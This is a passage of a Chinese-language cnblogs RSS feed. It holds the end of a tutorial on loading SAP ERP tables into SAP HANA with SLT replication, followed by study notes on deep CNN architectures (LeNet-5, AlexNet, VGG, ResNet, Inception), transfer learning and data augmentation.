&lt;ol&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;从Quick View前往Data provisioning。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;选择SAP HANA系统&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;点击完成按钮&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114102301363-108777078.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;程序会显示一个基于SLT的Table Data Provisioning屏幕。有5个用于data provisioning的选项：&lt;/p&gt;
&lt;table class=&quot;table table-striped&quot;&gt;&lt;tbody readability=&quot;7&quot;&gt;&lt;tr&gt;&lt;td&gt;
&lt;center&gt;Provision 选项&lt;/center&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;center&gt;描述&lt;/center&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;strong&gt;Load (Full Load)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;这是一个一次性事件，会开启从源系统的初始数据加载。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;&lt;strong&gt;Replicate&lt;/strong&gt; &lt;strong&gt;(Full Load + Delta Load)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;会开启一个初始加载（如果之前没进行过的话），并且也会传输增量数据。会为每个表创建数据库触发器和日志表。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;strong&gt;Stop Replication&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;为当前表停止复制过程。完全地移除触发器和日志表。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;&lt;strong&gt;Suspend&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;暂停正在进行的表复制过程。数据库触发器不会从源系统移除，日志也将继续记录。相关信息会存储在源系统的日志表里。&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;strong&gt;Resume&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;重启暂停的表复制。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;我们使用“加载选项”列表中的第一个选项来对表（LFBK）数据进行初始加载，将其从源系统加载到SAP HANA数据库。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;操作步骤如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;根据SAP SLT配置选择&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;源和目标系统详细信息&lt;/span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;点击加载按钮，然后选择我们需要在SAP HANA中加载/复制的表（LFBK）。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;表（LFBK）将被添加到数据加载管理部分，它的Action是&quot;Load&quot;，状态为&quot;Scheduled&quot;。&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114103528879-154164380.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;数据加载后，状态将变为“已执行”。 &lt;span&gt;该表和数据将在“SLTECC” schema中创建。&lt;/span&gt;&lt;/span&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;strong&gt;步骤3&lt;/strong&gt;）通过&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;schema&lt;/span&gt; “SLTECC”中的Data Preview检查表（LFBK）中的数据：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt; 使用SAP HANA Studio登录SAP HANA数据库，并且选择SAP HANA系统HDB（HANAUSER）。&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114103909801-1309918347.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;li&gt;在表节点下选择表（LFBK）。&lt;/li&gt;
&lt;li&gt;右键点击表（LFBK）选择打开Open data preview。&lt;/li&gt;
&lt;li&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;在&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;Data Preview&lt;/span&gt;屏幕中将显示通过SLT处理加载的数据。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114104130426-383361023.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;现在我们已经成功的将数据加载到表“LFBK”中。 &lt;span&gt;我们可以在未来的建模中使用这个表。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;非SAP系统和SAP HANA间的SLT连接&lt;/h2&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT Replication Server将所有元数据表定义从非ABAP源系统转换为SAP HANA的元数据表定义。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;对于非SAP的源，SLT连接具有以下功能：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;在复制表时，SAP SLT复制服务器将在源系统中创建日志表。  &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;读取引擎在SAP SLT复制服务器中创建。  &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;SAP SLT和源系统/SAP HANA之间的连接基于数据库连接。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;img title=&quot;SAP SLT Connection between Non - SAP SLT Connection and SAP HANA System/DATABASE&quot; src=&quot;https://images2017.cnblogs.com/blog/994049/201801/994049-20180114104552535-1442448243.png&quot; alt=&quot;SAP SLT Connection between Non - SAP SLT Connection and SAP HANA System/DATABASE&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;图  SAP SLT连接非SAP系统和SAP HANA数据库&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;result_box&quot; lang=&quot;zh-CN&quot;&gt;&lt;span&gt;SAP SLT只能进行最简单的转换，对于复杂的转换，我们需要其它的ETL工具，如SAP Data Services（SAP DS）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;英文原文：&lt;a href=&quot;https://www.guru99.com/slt-sap-landscape-transformation-replication-server-in-sap-hana.html&quot; target=&quot;_blank&quot;&gt;SLT (SAP Landscape Transformation Replication Server) in SAP HANA&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;参考阅读：&lt;a href=&quot;https://blogs.sap.com/2017/12/04/getting-started-with-sap-landscape-transformation-slt/&quot; target=&quot;_blank&quot;&gt;Introduction To SAP Landscape Transformation (SLT)&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span lang=&quot;zh-CN&quot;&gt;&lt;span&gt;　　　　　&lt;a href=&quot;https://www.guru99.com/sap-ds-sap-data-services-in-sap-hana.html&quot; target=&quot;_blank&quot;&gt;SAP DS (Data Services) in HANA&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 14 Jan 2018 02:54:00 +0000</pubDate>
<dc:creator>氢氦</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hhelibeb/p/8258915.html</dc:identifier>
</item>
<item>
<title>DeepLearning.ai学习笔记（四）卷积神经网络 -- week2深度卷积神经网络 实例探究 - marsggbo</title>
<link>http://www.cnblogs.com/marsggbo/p/8282475.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/marsggbo/p/8282475.html</guid>
<description>&lt;p&gt;通过他人的实例可以更好的理解如何构建卷积神经网络，本周课程主要会介绍如下网络&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;LeNet-5&lt;/li&gt;
&lt;li&gt;AlexNet&lt;/li&gt;
&lt;li&gt;VGG&lt;/li&gt;
&lt;li&gt;ResNet (有152层)&lt;/li&gt;
&lt;li&gt;Inception&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;lenet-5&quot;&gt;&lt;strong&gt;1.LeNet-5&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;该网络主要针对灰度图像训练的，用于识别手写数字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://opn1dyhml.bkt.clouddn.com/18-1-13/79199307.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;该网络是在1980s提出的，当时很少用到Padding，所以可以看到随着网络层次增加，图像的高度和宽度都是逐渐减小的，深度则不断增加。&lt;/p&gt;
&lt;p&gt;另外当时人们会更倾向于使用Average Pooling，但是现在则更推荐使用Max Pooling。&lt;/p&gt;
&lt;p&gt;还有就是最后的预测没有使用softmax，而是使用了一般的方法&lt;/p&gt;
&lt;h2 id=&quot;alexnet&quot;&gt;&lt;strong&gt;2. AlexNet&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://opn1dyhml.bkt.clouddn.com/18-1-13/47504975.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;AlexNet其实和LetNet-5有很多相似的地方，如大致的网络结构。不同的地方主要有如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;激活函数使用的是Relu，最后一层使用的是Softmax&lt;/li&gt;
&lt;li&gt;参数更多，有6000万个参数，而LeNet-5只有6万个左右&lt;/li&gt;
&lt;li&gt;使用Max Pooling&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;vgg-16&quot;&gt;&lt;strong&gt;3.VGG-16&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://opn1dyhml.bkt.clouddn.com/18-1-13/45226212.jpg&quot;/&gt;&lt;br/&gt;这个网络有点牛逼了，因为它有将近1.38亿个参数，即使放到现在也是一个很大的网络，但是这个网络的结构并不复杂。下面主要介绍一下上图网络。&lt;/p&gt;
&lt;p&gt;首先该网络使用的是&lt;strong&gt;Same&lt;/strong&gt;卷积，即保证高度和宽度不变，另外因为总共有16层卷积操作，所以就不把每一层都用图像的方式表现出来了，例如[CONV 64 X2]表示的是用64个过滤器进行&lt;strong&gt;Same卷积&lt;/strong&gt;操作2次，即右上角所画的示意图，(224,224,3) -&amp;gt; (224,224,64) -&amp;gt; (224,224,64)&lt;/p&gt;
&lt;p&gt;上面三个是比较经典的网络，如果想深入的理解，可以阅读其论文，不过吴大大建议的阅读顺序是AlexNet-&amp;gt;VGG-&amp;gt;LeNet。&lt;/p&gt;

&lt;p&gt;视频开始，吴大大表示“非常深的网络是很难训练的，因为存在梯度消失和梯度爆炸的问题”，为了解决这个问题，引入了(跳远链接)&lt;strong&gt;Skip Connection(跳远链接)&lt;/strong&gt;，残差网络正是使用了这个方法。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;残差块(Residual Block)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;首先介绍组成残差网络的单元：&lt;strong&gt;残差块(Residual Block)&lt;/strong&gt;，如下图示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/67pqzbk7xc.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;残差块是由两层网络节点组成的,&lt;span class=&quot;math inline&quot;&gt;\(a^{[l]}\)&lt;/span&gt;经过线性变化，再通过Relu激活函数后得到&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+1]}\)&lt;/span&gt;,&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}\)&lt;/span&gt;也同理，具体过程如下图示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/2n9fefexxu.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;特别注意上图中的&lt;strong&gt;紫色线&lt;/strong&gt;连接，&lt;span class=&quot;math inline&quot;&gt;\(a^{[l]}\)&lt;/span&gt;通过这条线直接将数据传递给&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}\)&lt;/span&gt;,所以&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}=g(z^{[l+1]}+a^{[l]})\)&lt;/span&gt;，这条紫色线也叫作&lt;strong&gt;short cut(或skip connection)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;残差网络&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/679iey8m74.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;如图示，残差网络每两层网络节点组成一个残差块，这也就是其与普通网络(&lt;strong&gt;Plain Network&lt;/strong&gt;)的差别。&lt;/p&gt;
&lt;p&gt;结合之前的课程我们知道如果使用普通网络训练模型，训练误差会随着网络层次加深先减小，而后会开始增加，而残差网络则不会有这种情况，反而它会随着层次增加，误差也会越来越小，这与理论相符。&lt;/p&gt;

&lt;p&gt;为了直观解释残差网络为什么有用，假设我们已经通过一个很大的神经网络得到了&lt;span class=&quot;math inline&quot;&gt;\(a^{[l]}\)&lt;/span&gt;。而现在我们又需要添加两层网络进去，我们看看如果添加的是残差块会有什么效果。如下图示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/oh658mp1aa.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由残差块的特点我们知道&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}=g(z^{[l+1]}+a^{[l]})=g(W^{[l+1]}a^{[l]}+b^{[l+1]}+a^{[l]})\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;我们先考虑一个极端情况，即&lt;span class=&quot;math inline&quot;&gt;\(W^{[l+1]}=0,b^{[l+1]}=0\)&lt;/span&gt;,那么&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}=g(a^{[l]})=a^{[l]}\)&lt;/span&gt; &lt;strong&gt;(因为激活函数是Relu)&lt;/strong&gt;，所以在添加了额外的两层网络后，即使最坏情况也是保持和之前结果一样。而如果只是加上普通的两层网络，可能结果会更好，但是也很有可能结果会越来越糟糕，这也就是为什么残差网络能够保证深度网络依旧有用的原因了。&lt;/p&gt;
&lt;p&gt;另外有个问题需要注意的是各层网络的&lt;strong&gt;维度&lt;/strong&gt;，因为&lt;span class=&quot;math inline&quot;&gt;\(a^{[l+2]}=g(z^{[l+1]}+a^{[l]})\)&lt;/span&gt;,那么就要求&lt;span class=&quot;math inline&quot;&gt;\(z^{[l+1]}\)&lt;/span&gt;要和&lt;span class=&quot;math inline&quot;&gt;\(a^{[l]}\)&lt;/span&gt;保持相同的维度所以残差网络使用的是&lt;strong&gt;Same卷积&lt;/strong&gt;。&lt;br/&gt;但是如果唯独不一样也没关系，可以给&lt;span class=&quot;math inline&quot;&gt;\(a^{[l]}\)&lt;/span&gt;乘上一个&lt;span class=&quot;math inline&quot;&gt;\(W_s\)&lt;/span&gt;来保持相同维度。&lt;span class=&quot;math inline&quot;&gt;\(W_s\)&lt;/span&gt;的值可以通过学习获得&lt;/p&gt;

&lt;p&gt;1*1卷积乍看起来好像很没用，如下图​&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/83a7ms49dd.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​但是如果这个1*1的卷积有深度呢？​&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/fxf0kqh6en.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​说个更加直观的理解就是使用1*1卷积可以很方便的减少深度，而不改变高度和宽度，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/fb3uuy95jb.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;只需要用32个(1*1*192)的过滤器即可,如果不用1*1卷积，例如采用2*2卷积,要想实现只改变深度，那么还需要使用padding，相比起来更加麻烦了。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;strong&gt;简介&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/h9gkzeqa1l.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如上图示，我们使用了各种过滤器，也是用了Max Pooling。但是这些并不需要人工的选择其个数，这些都可以通过学习来确定下来。所以这种方法很好的帮助我们选择何种过滤器的问题，这也就是&lt;strong&gt;Inception网络&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;计算成本&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;但是需要注意的一点则是随之而来的计算成本，尤其是5*5的过滤器，下面以这个过滤器举例进行说明：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/7b7cx56rol.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;如上图示，使用32个5*5*192的过滤器，对(28,28,192)进行&lt;strong&gt;Same卷积&lt;/strong&gt;运算得到(28,28,32)的输出矩阵，该卷积需要执行的乘法运算有多少次呢？&lt;/p&gt;
&lt;p&gt;输出矩阵中的一个数据是经过 &lt;span class=&quot;math inline&quot;&gt;\(5*5*192\)&lt;/span&gt;次乘法得到的，那么总共的乘法运算次数则是&lt;span class=&quot;math inline&quot;&gt;\(5*5*192*28*28*32=\)&lt;/span&gt;&lt;strong&gt;1.2亿&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;瓶颈层(Bottleneck layer)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面的运算次数多大1.2亿次，运算量相当之大，因此有另一种网络结构对此进行优化，而且可以达到同样的效果，即采用1*1卷积&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/lwt7cibmhi.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如图示进行了两次卷积，我们计算一下总共的乘法次数。&lt;/p&gt;
&lt;p&gt;第一次卷积：&lt;span class=&quot;math inline&quot;&gt;\(28*28*16*192=\)&lt;/span&gt;&lt;strong&gt;2.4million&lt;/strong&gt;&lt;br/&gt;第二次卷积：&lt;span class=&quot;math inline&quot;&gt;\(28*28*32*5*5*16=\)&lt;/span&gt;&lt;strong&gt;10million&lt;/strong&gt;&lt;br/&gt;总共乘法次数是&lt;strong&gt;12.4million&lt;/strong&gt;，这与上面直接用5*5过滤器的运算次数整整少了十倍。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://opn1dyhml.bkt.clouddn.com/18-1-13/61703587.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://opn1dyhml.bkt.clouddn.com/18-1-13/8075466.jpg&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这一节主要介绍了如何使用github，这里不做详细记录了。&lt;/p&gt;

&lt;p&gt;简单说就是在他人的基础上实现自己想要的模型，举个栗子，假如我们现在需要识别家里养的两只猫，分别叫小花和小白，但是我们只有比较少的图片。辛运的是网上已经有一个已经训练好的模型，是用来区分1000个不同事物的(包括猫)，其网络模型如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/2axxlreq8y.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​我们的需求是最后结果有三种：是小花，是小白，都不是。​所以需要对softmax做如下图修改。另外由于数据较少，所以可以对他人的模型的前面的结构中的参数进行冻结，即权重和偏差不做改动。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/rbt0pnskoh.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​当然，如果我们有一定量的数据，那么freeze的范围也可以随之减少，即拿来训练的层次可以增多&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/xtswft83ew.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;common-augmentation-methods&quot;&gt;&lt;strong&gt;1.Common augmentation methods&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;旋转(rotation)&lt;/li&gt;
&lt;li&gt;修剪(shearing)&lt;/li&gt;
&lt;li&gt;局部变形(local warping)&lt;/li&gt;
&lt;li&gt;镜像(mirroring)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/zhdmy34k9m.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;color-shifting&quot;&gt;&lt;strong&gt;2.Color shifting&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;我们都知道图像是由RGB三种颜色构成的，所以该数据扩充方法常采用&lt;strong&gt;PCA color augmentation&lt;/strong&gt;，即假如一个图片的R和G成分较多，那么该算法则会相应的减少R,G的值，而增加B的值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ask.qcloudimg.com/draft/1215004/xpbhg9rfke.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
&lt;footer&gt;&lt;br/&gt;&lt;h3 id=&quot;autoid-2-0-0&quot;&gt;&lt;br/&gt;&lt;strong&gt;MARSGGBO&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;♥&lt;/span&gt;原创&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;br/&gt;2018-1-14&lt;/strong&gt;
&lt;/p&gt;
&lt;br/&gt;&lt;/footer&gt;</description>
<pubDate>Sun, 14 Jan 2018 02:47:00 +0000</pubDate>
<dc:creator>marsggbo</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/marsggbo/p/8282475.html</dc:identifier>
</item>
</channel>
</rss>